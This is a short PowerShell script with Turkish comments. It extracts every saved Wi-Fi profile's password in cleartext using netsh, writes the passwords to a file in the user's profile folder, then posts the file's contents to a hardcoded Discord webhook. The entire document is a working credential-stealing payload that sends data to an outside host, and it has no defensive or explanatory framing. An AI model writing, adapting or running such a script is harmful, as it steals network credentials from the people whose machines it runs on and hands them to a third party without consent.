# Wi-Fi şifrelerini al ve bir dosyaya kaydet
netsh wlan show profiles | ForEach-Object {
    $profile = ($_ -split ':')[1].Trim()
    netsh wlan show profile name="$profile" key=clear
} > "$env:USERPROFILE\wifipass.txt"

# Discord Webhook URL'si
$w = 'https://discord.com/api/webhooks/1397314423084810250/BKCu31_MoFQOrfWi6ZGFGa7CXbGAcnIqeRfZXDXL7IG2Y0kRN6lYT_fxibN-8fIcBfTN'

# Dosya içeriğini oku
$f = Get-Content "$env:USERPROFILE\wifipass.txt" -Raw

# Mesajı JSON formatına dönüştür (tek tırnak ve string birleştirme ile)
$b = ConvertTo-Json @{content = '```' + $f + '```'}

# Discord'a gönder
Invoke-RestMethod -Uri $w -Method Post -Body $b -ContentType 'application/json'
